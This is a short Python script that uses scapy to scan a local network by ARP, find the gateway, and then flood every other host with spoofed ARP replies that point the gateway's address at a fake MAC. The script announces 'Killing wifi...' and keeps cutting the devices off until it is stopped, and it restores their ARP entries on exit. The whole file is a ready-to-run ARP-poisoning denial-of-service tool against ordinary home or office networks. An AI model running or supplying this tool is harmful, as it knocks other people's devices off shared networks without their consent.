import scapy.all as scapy
import signal

class scanner:
    def __init__(self):
        self.stop = False

    def signal_handler(self, sig, frame):
        self.stop = True

    def ArpScan(self, ip):
        self.ip = ip
        arp_r = scapy.ARP(pdst=ip)
        br = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
        request = br/arp_r
        answered, _ = scapy.srp(request, timeout=1, verbose=0)
        return answered
    
    def Arping(self, hosts, gw):
        while not self.stop:
            for host in hosts:
                if self.stop:
                    break
                arp_r = scapy.ARP(pdst=host[1].psrc, psrc=gw[1].psrc)
                br = scapy.Ether(dst=host[1].hwsrc, src='aa:bb:cc:dd:ee:ff')
                req = br/arp_r
                scapy.sendp(req, verbose=0)
        print("\nCleaning tables...")
        for host in hosts:
            arp_r = scapy.ARP(pdst=host[1].psrc, psrc=gw[1].psrc)
            br = scapy.Ether(dst=host[1].hwsrc, src=gw[1].hwsrc)
            req = br/arp_r
            scapy.sendp(req, verbose=0)


def main():
    my_ip = "192.168.0.96/24"  ## Demonstrative example, enter your IP here
    gw_ip = "192.168.0.1"  ## Gateway's IP, usually ends with .1 

    arp = scanner()
    signal.signal(signal.SIGINT, arp.signal_handler)
    arp_tables = arp.ArpScan(my_ip)
    gw = next(filter(lambda ip: ip[1].psrc == gw_ip, arp_tables), None)
    if gw is not None:
        print("Gateway", gw[1].psrc)
    else:
        print("Gateway not found.")
        return
    hosts = list(filter(lambda ip: ip[1].psrc != gw_ip, arp_tables))
    
    print("Killing wifi... Press CTRL+C to stop")
    arp.Arping(hosts, gw)


if __name__ == "__main__":
    main()